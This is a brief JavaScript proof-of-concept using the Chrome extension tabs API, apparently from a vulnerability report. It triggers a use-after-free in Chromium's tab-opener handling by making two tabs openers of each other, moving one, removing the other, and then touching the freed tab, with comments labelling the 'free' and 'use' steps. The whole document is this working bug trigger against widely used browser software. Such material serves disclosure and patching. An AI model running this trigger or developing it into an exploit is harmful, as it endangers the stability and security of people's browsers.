chrome.tabs.create({}, (tab1) => {
    chrome.tabs.create({}, (tab2) => {
        // set tab1 and tab2 to openers of each other
        chrome.tabs.update(tab1.id, { openerTabId: tab2.id });
        chrome.tabs.update(tab2.id, { openerTabId: tab1.id });

        // call TabStripModel::FixOpeners() => set tab2 (which is opener of tab1) to opener of itself
        chrome.tabs.move(tab1.id, { index: 2 });

        // remove tab2 => free
        // call TabStripModel::FixOpeners() => set tab2 (which is opener of tab2) to opener of tab1
        chrome.tabs.remove(tab2.id);

        chrome.tabs.get(tab1.id, () => {
            // access to removed tab2 (which is opener of tab1) => use
        });
    });
});
